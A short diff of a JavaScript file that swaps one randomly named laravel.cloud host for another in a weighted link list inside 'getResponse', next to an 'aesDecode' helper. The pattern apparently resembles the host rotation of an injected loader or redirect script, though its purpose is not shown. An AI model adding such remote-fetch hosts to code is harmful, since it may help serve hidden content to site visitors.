@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://laravel-1-copp-jd6krx.laravel.cloud/", weight: 0.5 },
-        { url: "https://laravel-1-copp-jd6krx.laravel.cloud/", weight: 0.5 }
+        { url: "https://laravel-1-niuii-obx70b.laravel.cloud/", weight: 0.5 },
+        { url: "https://laravel-1-niuii-obx70b.laravel.cloud/", weight: 0.5 }
       
     ];
 
